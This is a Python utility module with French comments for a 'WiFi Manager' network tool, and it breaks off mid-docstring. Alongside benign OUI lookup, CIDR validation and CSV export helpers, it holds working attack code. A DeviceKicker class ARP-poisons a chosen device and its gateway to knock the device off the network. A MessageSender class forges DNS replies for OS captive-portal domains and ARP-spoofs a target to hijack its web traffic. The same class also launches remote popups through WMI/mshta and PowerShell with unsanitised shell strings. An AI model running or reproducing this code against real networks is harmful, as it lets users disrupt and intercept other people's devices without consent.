"""
Fonctions utilitaires pour le WIFI Manager.
Inclut: validation CIDR, lookup OUI, parsing, export CSV, etc.
"""

import ipaddress
import urllib.request
import os
from pathlib import Path
from typing import Optional, Dict, List
import csv
from datetime import datetime
import platform
import threading
import time
from scapy.all import ARP, Ether, sendp, srp, conf, get_if_addr, get_if_hwaddr
import socket
import struct


class OUIDatabase:
    """
    Gère la base de données OUI (Organizationally Unique Identifier) pour 
    la résolution des adresses MAC vers les noms de vendeurs.
    """
    
    OUI_URL = "https://standards-oui.ieee.org/oui/oui.txt"
    CACHE_DIR = Path(os.path.expanduser("~/.wifi_manager"))
    CACHE_FILE = CACHE_DIR / "oui_cache.txt"
    
    def __init__(self, auto_download: bool = True):
        """
        Initialise la base de données OUI.
        
        Args:
            auto_download: Si True, télécharge automatiquement si absent
        """
        self.oui_map = {}
        self.cache_loaded = False
        
        if auto_download:
            self.ensure_cache()
        
        self._load_cache()
    
    def ensure_cache(self):
        """Télécharge le fichier OUI s'il n'existe pas."""
        if self.CACHE_FILE.exists():
            return
        
        try:
            # Crée le répertoire s'il n'existe pas
            self.CACHE_DIR.mkdir(parents=True, exist_ok=True)
            
            print(f"[OUI] Téléchargement de {self.OUI_URL}...")
            urllib.request.urlretrieve(self.OUI_URL, str(self.CACHE_FILE))
            print(f"[OUI] Cache téléchargé: {self.CACHE_FILE}")
        except Exception as e:
            print(f"[OUI] Erreur lors du téléchargement: {e}")
            print("[OUI] Continuera sans lookup de vendor")
    
    def _load_cache(self):
        """Charge la base OUI depuis le fichier cache."""
        if not self.CACHE_FILE.exists():
            print(f"[OUI] Cache non trouvé: {self.CACHE_FILE}")
            return
        
        try:
            with open(self.CACHE_FILE, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    
                    # Format: "XX-XX-XX" (hex)" "Vendor Name"
                    if len(line) > 8 and line[8] in '(\t':
                        mac_prefix = line[:8].replace('-', ':').upper()
                        
                        # Extrait le nom du vendor
                        if '(' in line:
                            vendor_name = line[line.index('(') + 1:line.index(')')].strip()
                        else:
                            vendor_name = line[9:].strip()
                        
                        self.oui_map[mac_prefix] = vendor_name
            
            self.cache_loaded = True
            print(f"[OUI] Cache chargé: {len(self.oui_map)} entrées")
        
        except Exception as e:
            print(f"[OUI] Erreur lors du chargement: {e}")
    
    def lookup(self, mac_address: str) -> str:
        """
        Résout une adresse MAC vers le nom du vendor.
        
        Args:
            mac_address: Adresse MAC (format XX:XX:XX:XX:XX:XX)
            
        Returns:
            Nom du vendor ou "Unknown"
        """
        if not mac_address:
            return "Unknown"
        
        try:
            # Extrait les 3 premiers octets (OUI)
            mac_prefix = mac_address.upper()[:8]
            return self.oui_map.get(mac_prefix, "Unknown")
        except Exception as e:
            print(f"[OUI] Erreur lookup pour {mac_address}: {e}")
            return "Unknown"


class CIDRValidator:
    """Valide et parse les adresses CIDR."""
    
    @staticmethod
    def is_valid(cidr: str) -> bool:
        """
        Vérifie si une chaîne est un CIDR valide.
        
        Args:
            cidr: Chaîne au format "192.168.1.0/24"
            
        Returns:
            True si valide
        """
        try:
            ipaddress.IPv4Network(cidr, strict=False)
            return True
        except (ValueError, TypeError):
            return False
    
    @staticmethod
    def parse(cidr: str) -> Optional[ipaddress.IPv4Network]:
        """
        Parse une chaîne CIDR en IPv4Network.
        
        Args:
            cidr: Chaîne CIDR
            
        Returns:
            Objet IPv4Network ou None
        """
        try:
            return ipaddress.IPv4Network(cidr, strict=False)
        except (ValueError, TypeError):
            return None
    
    @staticmethod
    def get_suggestion() -> str:
        """Retourne une suggestion de CIDR basée sur l'IP locale."""
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            
            # Retourne un /24 basé sur les 3 premiers octets
            parts = local_ip.split('.')
            return f"{'.'.join(parts[:3])}.0/24"
        except:
            return "192.168.1.0/24"


class CSVExporter:
    """Exporte les résultats de scan en CSV."""
    
    @staticmethod
    def export(devices: List[Dict], filepath: str) -> bool:
        """
        Exporte les appareils découverts en CSV.
        
        Args:
            devices: Liste des appareils {ip, mac, vendor, ping}
            filepath: Chemin du fichier de destination
            
        Returns:
            True si succès
        """
        try:
            # Prépare les données
            rows = []
            for i, device in enumerate(devices, 1):
                row = {
                    'Index': i,
                    'IP': device.get('ip', ''),
                    'MAC': device.get('mac', ''),
                    'Vendor': device.get('vendor', 'Unknown'),
                    'Ping (ms)': f"{device.get('ping', '')}",
                }
                rows.append(row)
            
            # Écrit le CSV
            if rows:
                with open(filepath, 'w', newline='', encoding='utf-8') as f:
                    writer = csv.DictWriter(f, fieldnames=rows[0].keys())
                    writer.writeheader()
                    writer.writerows(rows)
                
                return True
            else:
                # Fichier vide si pas de données
                with open(filepath, 'w', encoding='utf-8') as f:
                    f.write("Index,IP,MAC,Vendor,Ping (ms)\n")
                
                return True
        
        except Exception as e:
            print(f"[CSV] Erreur lors de l'export: {e}")
            return False
    
    @staticmethod
    def get_default_filename() -> str:
        """Retourne un nom de fichier par défaut avec timestamp."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        return f"scan_results_{timestamp}.csv"


class PingUtils:
    """Utilitaires pour le ping."""
    
    @staticmethod
    def get_ping_command() -> tuple:
        """
        Retourne la commande ping appropriée pour le système.
        
        Returns:
            Tuple (commande_base, count_param)
        """
        if platform.system().lower() == 'windows':
            return ('ping', '-n')
        else:  # Linux, macOS
            return ('ping', '-c')
    
    @staticmethod
    def validate_ip(ip: str) -> bool:
        """
        Valide une adresse IP.
        
        Args:
            ip: Adresse IP à valider
            
        Returns:
            True si valide
        """
        try:
            ipaddress.IPv4Address(ip)
            return True
        except (ValueError, TypeError):
            return False


class DeviceKicker:
    """
    Classe pour déconnecter un appareil du réseau.
    Utilise l'ARP spoofing pour empoisonner le cache ARP de la cible.
    """
    
    def __init__(self):
        """Initialise le kicker."""
        self.is_kicking = False
        self.kick_thread = None
    
    def get_gateway_info(self, target_ip: str) -> tuple:
        """
        Obtient l'IP et le MAC de la passerelle par défaut.
        
        Args:
            target_ip: IP de la cible pour déterminer l'interface
            
        Returns:
            Tuple (gateway_ip, gateway_mac)
        """
        try:
            gateway_ip = None
            
            # Méthode Windows pour obtenir la passerelle par défaut
            if platform.system().lower() == 'windows':
                import subprocess
                import re
                
                # Méthode 1: Parser route print
                result = subprocess.run(['route', 'print', '0.0.0.0'], 
                                      capture_output=True, text=True, encoding='cp437')
                
                # Cherche la route par défaut (0.0.0.0)
                for line in result.stdout.split('\n'):
                    # Format: Network Destination    Netmask          Gateway       Interface  Metric
                    # Exemple: 0.0.0.0          0.0.0.0      192.168.1.1   192.168.1.100     50
                    if '0.0.0.0' in line and len(line.split()) >= 3:
                        parts = line.split()
                        # Trouve la première IP valide qui n'est pas 0.0.0.0
                        for part in parts:
                            if re.match(r'^(\d{1,3}\.){3}\d{1,3}$', part) and part != '0.0.0.0':
                                gateway_ip = part
                                break
                        if gateway_ip:
                            break
                
                # Méthode 2: Si route print échoue, essayer ipconfig
                if not gateway_ip:
                    result = subprocess.run(['ipconfig'], capture_output=True, text=True, encoding='cp437')
                    output = result.stdout
                    
                    # Parse la sortie pour trouver la passerelle (supporte EN/FR)
                    for line in output.split('\n'):
                        if 'Default Gateway' in line or 'Passerelle par défaut' in line or 'Passerelle' in line:
                            # Extrait l'IP après les ':'
                            parts = line.split(':')
                            if len(parts) > 1:
                                ip_candidate = parts[-1].strip()
                                # Vérifie que c'est une IP valide
                                if re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip_candidate):
                                    gateway_ip = ip_candidate
                                    break
            else:
                # Méthode Unix/Linux
                import subprocess
                result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'default' in line:
                        parts = line.split()
                        if len(parts) >= 3:
                            gateway_ip = parts[2]
                            break
            
            if not gateway_ip:
                print("[Kick] Aucune passerelle trouvée dans la configuration réseau")
                return None, None
            
            print(f"[Kick] Passerelle détectée: {gateway_ip}")
            
            # Obtient le MAC de la passerelle via ARP
            print(f"[Kick] Résolution du MAC de la passerelle...")
            arp_request = ARP(pdst=gateway_ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
            
            if answered_list:
                gateway_mac = answered_list[0][1].hwsrc
                print(f"[Kick] MAC de la passerelle: {gateway_mac}")
                return gateway_ip, gateway_mac
            
            print(f"[Kick] Impossible de résoudre le MAC de la passerelle {gateway_ip}")
            return gateway_ip, None
        
        except Exception as e:
            print(f"[Kick] Erreur lors de la récupération de la passerelle: {e}")
            import traceback
            traceback.print_exc()
            return None, None
    
    def spoof_arp(self, target_ip: str, target_mac: str, spoof_ip: str, spoof_mac: str = None):
        """
        Envoie un paquet ARP falsifié à la cible.
        
        Args:
            target_ip: IP de la cible
            target_mac: MAC de la cible
            spoof_ip: IP à usurper (généralement la passerelle)
            spoof_mac: MAC à utiliser (None = notre MAC)
        """
        try:
            # Utilise une fausse MAC (00:00:00:00:00:00) pour casser la connexion
            fake_mac = "00:00:00:00:00:00"
            
            # Envoie 3 paquets pour assurer la réception
            for _ in range(3):
                # Paquet ARP avec fausse MAC (unicast)
                arp_unicast = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                                 psrc=spoof_ip, hwsrc=fake_mac)
                sendp(Ether(dst=target_mac) / arp_unicast, verbose=False)
                
                # Paquet ARP en broadcast pour saturer
                arp_broadcast = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff",
                                   psrc=spoof_ip, hwsrc=fake_mac)
                sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / arp_broadcast, verbose=False)
        
        except Exception as e:
            print(f"[Kick] Erreur lors de l'envoi ARP: {e}")
    
    def restore_arp(self, target_ip: str, target_mac: str, gateway_ip: str, gateway_mac: str):
        """
        Restaure le cache ARP de la cible.
        
        Args:
            target_ip: IP de la cible
            target_mac: MAC de la cible
            gateway_ip: IP de la passerelle
            gateway_mac: MAC de la passerelle
        """
        try:
            arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                              psrc=gateway_ip, hwsrc=gateway_mac)
            sendp(Ether(dst=target_mac) / arp_response, count=5, verbose=False)
        
        except Exception as e:
            print(f"[Kick] Erreur lors de la restauration ARP: {e}")
    
    def kick_device(self, target_ip: str, target_mac: str, duration: int = 30) -> bool:
        """
        Déconnecte un appareil du réseau pendant une durée spécifiée.
        
        Args:
            target_ip: IP de l'appareil à déconnecter
            target_mac: MAC de l'appareil à déconnecter
            duration: Durée en secondes (0 = jusqu'à arrêt manuel)
            
        Returns:
            True si le kick a démarré, False sinon
        """
        if self.is_kicking:
            print("[Kick] Un kick est déjà en cours")
            return False
        
        # Obtient les infos de la passerelle
        gateway_ip, gateway_mac = self.get_gateway_info(target_ip)
        
        if not gateway_ip or not gateway_mac:
            print("[Kick] Impossible de trouver la passerelle")
            return False
        
        print(f"[Kick] Démarrage du kick - Cible: {target_ip} ({target_mac})")
        print(f"[Kick] Passerelle: {gateway_ip} ({gateway_mac})")
        print(f"[Kick] Durée: {duration}s" if duration > 0 else "[Kick] Durée: Illimitée")
        
        self.is_kicking = True
        
        # Lance le kick dans un thread séparé
        self.kick_thread = threading.Thread(
            target=self._kick_worker,
            args=(target_ip, target_mac, gateway_ip, gateway_mac, duration),
            daemon=True
        )
        self.kick_thread.start()
        
        return True
    
    def _kick_worker(self, target_ip: str, target_mac: str, 
                     gateway_ip: str, gateway_mac: str, duration: int):
        """
        Worker thread qui effectue le kick.
        
        Args:
            target_ip: IP de la cible
            target_mac: MAC de la cible
            gateway_ip: IP de la passerelle
            gateway_mac: MAC de la passerelle
            duration: Durée en secondes
        """
        try:
            start_time = time.time()
            packet_count = 0
            
            # Désactive la sortie Scapy
            conf.verb = 0
            
            print("[Kick] Mode agressif activé - envoi de paquets ARP empoisonnés...")
            
            while self.is_kicking:
                # Empoisonne le cache ARP de la cible (lui fait croire que nous sommes la passerelle)
                self.spoof_arp(target_ip, target_mac, gateway_ip)
                
                # Empoisonne aussi le cache ARP de la passerelle (lui fait croire que nous sommes la cible)
                self.spoof_arp(gateway_ip, gateway_mac, target_ip)
                
                packet_count += 12  # 6 paquets par spoof_arp × 2
                
                # Log de progression toutes les 10 secondes
                elapsed = time.time() - start_time
                if int(elapsed) % 10 == 0 and int(elapsed) > 0:
                    remaining = duration - int(elapsed) if duration > 0 else "∞"
                    print(f"[Kick] En cours... {int(elapsed)}s écoulées, {packet_count} paquets envoyés, reste: {remaining}s")
                
                # Vérifie si la durée est écoulée
                if duration > 0 and (time.time() - start_time) >= duration:
                    break
                
                time.sleep(0.2)  # Envoie des paquets toutes les 0.2 secondes (plus agressif)
            
            print(f"[Kick] Fin du kick - {packet_count} paquets envoyés en {int(time.time() - start_time)}s")
            
            # Restaure le cache ARP
            print("[Kick] Restauration du cache ARP...")
            self.restore_arp(target_ip, target_mac, gateway_ip, gateway_mac)
            self.restore_arp(gateway_ip, gateway_mac, target_ip, target_mac)
            print("[Kick] Restauration terminée")
            
        except Exception as e:
            print(f"[Kick] Erreur dans le worker: {e}")
            import traceback
            traceback.print_exc()
        
        finally:
            self.is_kicking = False
    
    def stop_kick(self):
        """Arrête le kick en cours."""
        if self.is_kicking:
            print("[Kick] Arrêt demandé...")
            self.is_kicking = False
            if self.kick_thread:
                self.kick_thread.join(timeout=5)
            return True
        return False


class MessageSender:
    """
    Classe pour envoyer des messages à des appareils sur le réseau.
    Utilise différents protocoles pour la transmission.
    """
    
    def __init__(self):
        """Initialise le message sender."""
        self.web_server = None
        self.web_server_thread = None
        self.hijack_thread = None
        self.is_hijacking = False
    
    def create_message_webpage(self, message: str, title: str = "Network Message") -> str:
        """
        Crée une page HTML pour afficher le message.
        
        Args:
            message: Message à afficher
            title: Titre de la page
            
        Returns:
            Code HTML de la page
        """
        html = f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title}</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }}
        .container {{
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 600px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            animation: slideIn 0.5s ease-out;
        }}
        @keyframes slideIn {{
            from {{
                opacity: 0;
                transform: translateY(-50px);
            }}
            to {{
                opacity: 1;
                transform: translateY(0);
            }}
        }}
        h1 {{
            color: #667eea;
            margin-bottom: 20px;
            font-size: 2em;
            text-align: center;
        }}
        .icon {{
            text-align: center;
            font-size: 4em;
            margin-bottom: 20px;
        }}
        .message {{
            background: #f7f7f7;
            padding: 30px;
            border-radius: 10px;
            font-size: 1.2em;
            line-height: 1.6;
            color: #333;
            margin-bottom: 20px;
            border-left: 5px solid #667eea;
            white-space: pre-wrap;
            word-wrap: break-word;
        }}
        .footer {{
            text-align: center;
            color: #999;
            font-size: 0.9em;
            margin-top: 20px;
        }}
        .close-btn {{
            background: #667eea;
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 50px;
            font-size: 1.1em;
            cursor: pointer;
            width: 100%;
            margin-top: 20px;
            transition: all 0.3s;
        }}
        .close-btn:hover {{
            background: #5568d3;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">📨</div>
        <h1>{title}</h1>
        <div class="message">{message}</div>
        <button class="close-btn" onclick="window.close()">Fermer</button>
        <div class="footer">Message envoyé via WiFi Manager</div>
    </div>
    <script>
        // Auto-refresh every 30 seconds to keep showing the message
        setTimeout(function() {{
            location.reload();
        }}, 30000);
        
        // Make the page flash to get attention
        document.body.style.animation = 'flash 1s ease-in-out 3';
        
        // Play notification sound if possible
        try {{
            var audio = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBSuFzvLZiTUHF2e167inUxQMUKXh8LZkHAU4kNbyzn0vBSh+zPLaizsKGGS36+mjVhYMTqXi8bllHwU7k9n1z4BBCRVlu+zop1YYDFCL4PC2YxwFOJDW8s5+MAUpfszy2YpAChdiuOvooFITC06k4PG2ZRwFOpHX88+BQAoVZbvs6KdXGAxPi+DwtmQcBTmP1vPPfjAFKH7M8tmKQAoXYrjr6KFSE');
            audio.play();
        }} catch(e) {{}}
    </script>
</body>
</html>
        """
        return html
    
    def start_message_server(self, message: str, port: int = 8080) -> bool:
        """
        Démarre un serveur HTTP qui affiche le message.
        
        Args:
            message: Message à afficher
            port: Port HTTP (par défaut 8080)
            
        Returns:
            True si démarré avec succès
        """
        try:
            from http.server import HTTPServer, BaseHTTPRequestHandler
            import threading
            
            html_content = self.create_message_webpage(message)
            
            class MessageHandler(BaseHTTPRequestHandler):
                def do_GET(self):
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html; charset=utf-8')
                    self.end_headers()
                    self.wfile.write(html_content.encode('utf-8'))
                
                def log_message(self, format, *args):
                    # Silence les logs
                    pass
            
            self.web_server = HTTPServer(('0.0.0.0', port), MessageHandler)
            
            def run_server():
                print(f"[Message] Serveur web démarré sur le port {port}")
                self.web_server.serve_forever()
            
            self.web_server_thread = threading.Thread(target=run_server, daemon=True)
            self.web_server_thread.start()
            
            return True
            
        except Exception as e:
            print(f"[Message] Erreur serveur web: {e}")
            return False
    
    def stop_message_server(self):
        """Arrête le serveur web."""
        if self.web_server:
            self.web_server.shutdown()
            self.web_server = None
            print("[Message] Serveur web arrêté")
    
    def trigger_captive_portal(self, target_ip: str) -> bool:
        """
        Déclenche la détection de captive portal sur la cible.
        Envoie des paquets qui forcent le système à ouvrir le navigateur.
        
        Args:
            target_ip: IP de la cible
            
        Returns:
            True si envoyé
        """
        try:
            print(f"[Message] Déclenchement captive portal pour {target_ip}")
            
            # Liste des domaines utilisés par les OS pour détecter les captive portals
            captive_domains = [
                'www.msftconnecttest.com',  # Windows
                'www.msftncsi.com',  # Windows
                'connectivitycheck.gstatic.com',  # Android
                'clients3.google.com',  # Android
                'captive.apple.com',  # iOS/macOS
                'www.apple.com',  # iOS/macOS
                'www.google.com',  # General
            ]
            
            # Envoie des requêtes DNS spoofées
            from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send
            import socket
            
            # Notre IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            our_ip = s.getsockname()[0]
            s.close()
            
            for domain in captive_domains:
                # Crée une réponse DNS qui pointe vers notre serveur
                dns_response = IP(dst=target_ip, src='8.8.8.8') / \
                              UDP(dport=53, sport=53) / \
                              DNS(id=12345, qr=1, aa=1, qd=DNSQR(qname=domain), 
                                  an=DNSRR(rrname=domain, ttl=10, rdata=our_ip))
                
                send(dns_response, verbose=False)
                print(f"[Message] DNS spoofé: {domain} -> {our_ip}")
            
            return True
            
        except Exception as e:
            print(f"[Message] Erreur captive portal trigger: {e}")
            return False
    
    def hijack_web_traffic(self, target_ip: str, target_mac: str, gateway_ip: str, 
                          gateway_mac: str, server_ip: str, duration: int = 60) -> bool:
        """
        Intercepte le trafic web de la cible pour rediriger vers notre serveur.
        Utilise ARP spoofing + DNS spoofing + Captive portal trigger.
        
        Args:
            target_ip: IP de la cible
            target_mac: MAC de la cible
            gateway_ip: IP de la passerelle
            gateway_mac: MAC de la passerelle
            server_ip: Notre IP où le serveur web tourne
            duration: Durée en secondes
            
        Returns:
            True si démarré
        """
        try:
            print(f"[Message] Démarrage hijack web vers {target_ip}")
            
            self.is_hijacking = True
            
            def hijack_worker():
                from scapy.all import sniff, ARP, Ether, IP, TCP, UDP, DNS, DNSQR, DNSRR, Raw, sendp, send
                import time
                
                start_time = time.time()
                conf.verb = 0
                
                # Déclenche le captive portal immédiatement
                print("[Message] Déclenchement du captive portal...")
                self.trigger_captive_portal(target_ip)
                
                # ARP spoofing + DNS spoofing en continu
                def spoof_loop():
                    packet_count = 0
                    while self.is_hijacking and (time.time() - start_time) < duration:
                        # ARP spoofing - Empoisonne la cible
                        arp_target = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                                        psrc=gateway_ip, hwsrc="00:00:00:00:00:00")
                        sendp(Ether(dst=target_mac) / arp_target, verbose=False)
                        
                        # ARP spoofing - Empoisonne la passerelle
                        arp_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                                         psrc=target_ip, hwsrc="00:00:00:00:00:00")
                        sendp(Ether(dst=gateway_mac) / arp_gateway, verbose=False)
                        
                        packet_count += 2
                        
                        # Toutes les 5 secondes, re-déclenche le captive portal
                        if packet_count % 50 == 0:
                            self.trigger_captive_portal(target_ip)
                        
                        time.sleep(0.2)
                    
                    # Restaure
                    print("[Message] Restauration ARP...")
                    for _ in range(5):
                        arp_restore = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                                         psrc=gateway_ip, hwsrc=gateway_mac)
                        sendp(Ether(dst=target_mac) / arp_restore, verbose=False)
                    
                    self.is_hijacking = False
                    print(f"[Message] Hijack terminé - {packet_count} paquets envoyés")
                
                # Lance le spoofing
                spoof_loop()
            
            self.hijack_thread = threading.Thread(target=hijack_worker, daemon=True)
            self.hijack_thread.start()
            
            return True
            
        except Exception as e:
            print(f"[Message] Erreur hijack: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def send_web_message(self, target_ip: str, target_mac: str, message: str, 
                        duration: int = 60) -> bool:
        """
        Envoie un message qui s'affiche dans le navigateur de la cible.
        Utilise ARP spoofing + serveur web local.
        
        Args:
            target_ip: IP de la cible
            target_mac: MAC de la cible
            message: Message à afficher
            duration: Durée d'affichage en secondes
            
        Returns:
            True si démarré
        """
        try:
            # Obtient notre IP
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            our_ip = s.getsockname()[0]
            s.close()
            
            print(f"[Message] Notre IP: {our_ip}")
            
            # Démarre le serveur web
            if not self.start_message_server(message, port=80):
                return False
            
            # Obtient la passerelle
            from scanner.utils import DeviceKicker
            kicker = DeviceKicker()
            gateway_ip, gateway_mac = kicker.get_gateway_info(target_ip)
            
            if not gateway_ip or not gateway_mac:
                print("[Message] Impossible de trouver la passerelle")
                self.stop_message_server()
                return False
            
            print(f"[Message] Passerelle: {gateway_ip} ({gateway_mac})")
            
            # Lance le hijack
            success = self.hijack_web_traffic(
                target_ip, target_mac, gateway_ip, gateway_mac, our_ip, duration
            )
            
            if success:
                print(f"[Message] ✓ Web hijack actif pour {duration}s")
                print(f"[Message] La cible verra le message dans son navigateur")
                print(f"[Message] Serveur: http://{our_ip}/")
                return True
            else:
                self.stop_message_server()
                return False
                
        except Exception as e:
            print(f"[Message] Erreur send_web_message: {e}")
            import traceback
            traceback.print_exc()
            self.stop_message_server()
            return False
    
    def send_windows_msg(self, target_ip: str, message: str, username: str = "*") -> bool:
        """
        Envoie un message popup Windows via la commande 'msg'.
        Fonctionne sur Windows si Remote Desktop Services est activé.
        
        Args:
            target_ip: IP de l'appareil cible (Windows uniquement)
            message: Message à afficher
            username: Nom d'utilisateur cible (* = tous les utilisateurs)
            
        Returns:
            True si envoyé avec succès, False sinon
        """
        try:
            import subprocess
            
            print(f"[Message] Tentative d'envoi Windows MSG vers {target_ip}")
            
            # Commande msg : msg /SERVER:IP username message
            cmd = ['msg', f'/SERVER:{target_ip}', username, message]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                print(f"[Message] Message Windows envoyé avec succès")
                return True
            else:
                print(f"[Message] Échec: {result.stderr}")
                return False
        
        except subprocess.TimeoutExpired:
            print(f"[Message] Timeout - Le serveur ne répond pas")
            return False
        except Exception as e:
            print(f"[Message] Erreur lors de l'envoi Windows MSG: {e}")
            return False
    
    def send_smb_notification(self, target_ip: str, message: str) -> bool:
        """
        Tente d'envoyer une notification via SMB/NetBIOS.
        Peut fonctionner sur certains réseaux Windows.
        
        Args:
            target_ip: IP de l'appareil cible
            message: Message à envoyer
            
        Returns:
            True si envoyé avec succès, False sinon
        """
        try:
            import subprocess
            
            print(f"[Message] Tentative de notification SMB vers {target_ip}")
            
            # Utilise net send (si disponible) ou PowerShell
            # Note: net send est déprécié depuis Windows Vista
            
            # Alternative: Utiliser PowerShell Invoke-Command si WinRM est activé
            ps_script = f'''
            $message = "{message}"
            $target = "{target_ip}"
            try {{
                Invoke-Command -ComputerName $target -ScriptBlock {{
                    param($msg)
                    Add-Type -AssemblyName System.Windows.Forms
                    [System.Windows.Forms.MessageBox]::Show($msg, "Network Message", 0, [System.Windows.Forms.MessageBoxIcon]::Information)
                }} -ArgumentList $message
            }} catch {{
                Write-Error $_.Exception.Message
            }}
            '''
            
            result = subprocess.run(
                ['powershell', '-Command', ps_script],
                capture_output=True,
                text=True,
                timeout=15
            )
            
            if result.returncode == 0:
                print(f"[Message] Notification SMB envoyée")
                return True
            else:
                print(f"[Message] Échec SMB: {result.stderr}")
                return False
        
        except Exception as e:
            print(f"[Message] Erreur lors de l'envoi SMB: {e}")
            return False
    
    def send_popup_notification(self, target_ip: str, message: str, title: str = "Network Alert") -> bool:
        """
        Tente plusieurs méthodes pour afficher un popup sur l'appareil cible.
        
        Args:
            target_ip: IP de l'appareil cible
            message: Message à afficher
            title: Titre de la notification
            
        Returns:
            True si au moins une méthode a réussi
        """
        print(f"[Message] Tentative d'affichage popup sur {target_ip}")
        
        success = False
        
        # Méthode 1: msg command (Windows)
        if self.send_windows_msg(target_ip, f"{title}: {message}"):
            success = True
        
        # Méthode 2: SMB notification
        if self.send_smb_notification(target_ip, message):
            success = True
        
        # Méthode 3: WMI remote execution (crée un popup via mshta)
        try:
            import subprocess
            
            # Créer un popup via WMI et mshta.exe
            wmi_cmd = f'''
            wmic /node:"{target_ip}" process call create "mshta vbscript:Execute(\\"msgbox \\\\\\"{message}\\\\\\",64,\\\\\\"{title}\\\\\\"::close\\")"
            '''
            
            result = subprocess.run(
                wmi_cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if "successful" in result.stdout.lower():
                print(f"[Message] Popup WMI créé avec succès")
                success = True
        except Exception as e:
            print(f"[Message] WMI échoué: {e}")
        
        return success
    
    def send_udp_message(self, target_ip: str, message: str, port: int = 9999) -> bool:
        """
        Envoie un message UDP à un appareil.
        
        Args:
            target_ip: IP de l'appareil cible
            message: Message à envoyer
            port: Port UDP (par défaut 9999)
            
        Returns:
            True si envoyé avec succès, False sinon
        """
        try:
            print(f"[Message] Envoi UDP vers {target_ip}:{port}")
            
            # Crée un socket UDP
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            
            # Encode le message
            message_bytes = message.encode('utf-8')
            
            # Envoie le message
            sock.sendto(message_bytes, (target_ip, port))
            
            print(f"[Message] Message envoyé ({len(message_bytes)} bytes)")
            sock.close()
            
            return True
        
        except Exception as e:
            print(f"[Message] Erreur lors de l'envoi UDP: {e}")
            return False
    
    def send_tcp_message(self, target_ip: str, message: str, port: int = 9999) -> bool:
        """
        Envoie un message TCP à un appareil.
        
        Args:
            target_ip: IP de l'appareil cible
            message: Message à envoyer
            port: Port TCP (par défaut 9999)
            
        Returns:
            True si envoyé avec succès, False sinon
        """
        try:
            print(f"[Message] Tentative de connexion TCP à {target_ip}:{port}")
            
            # Crée un socket TCP
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            # Tente de se connecter
            sock.connect((target_ip, port))
            
            # Encode et envoie le message
            message_bytes = message.encode('utf-8')
            sock.sendall(message_bytes)
            
            print(f"[Message] Message TCP envoyé ({len(message_bytes)} bytes)")
            sock.close()
            
            return True
        
        except socket.timeout:
            print(f"[Message] Timeout - Le port {port} ne répond pas")
            return False
        except ConnectionRefusedError:
            print(f"[Message] Connexion refusée - Aucun service sur le port {port}")
            return False
        except Exception as e:
            print(f"[Message] Erreur lors de l'envoi TCP: {e}")
            return False
    
    def send_broadcast_message(self, message: str, port: int = 9999) -> bool:
        """
        Envoie un message en broadcast à tous les appareils du réseau.
        
        Args:
            message: Message à envoyer
            port: Port UDP pour le broadcast (par défaut 9999)
            
        Returns:
            True si envoyé avec succès, False sinon
        """
        try:
            print(f"[Message] Envoi en broadcast sur le port {port}")
            
            # Crée un socket UDP
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock.settimeout(2)
            
            # Encode le message
            message_bytes = message.encode('utf-8')
            
            # Envoie en broadcast
            sock.sendto(message_bytes, ('<broadcast>', port))
            
            print(f"[Message] Broadcast envoyé ({len(message_bytes)} bytes)")
            sock.close()
            
            return True
        
        except Exception as e:
            print(f"[Message] Erreur lors du broadcast: {e}")
            return False
    
    def send_http_notification(self, target_ip: str, message: str, port: int = 80) -> bool:
        """
        Envoie une requête HTTP POST avec le message.
        Utile si l'appareil a un serveur web qui accepte les notifications.
        
        Args:
            target_ip: IP de l'appareil cible
            message: Message à envoyer
            port: Port HTTP (par défaut 80)
            
        Returns:
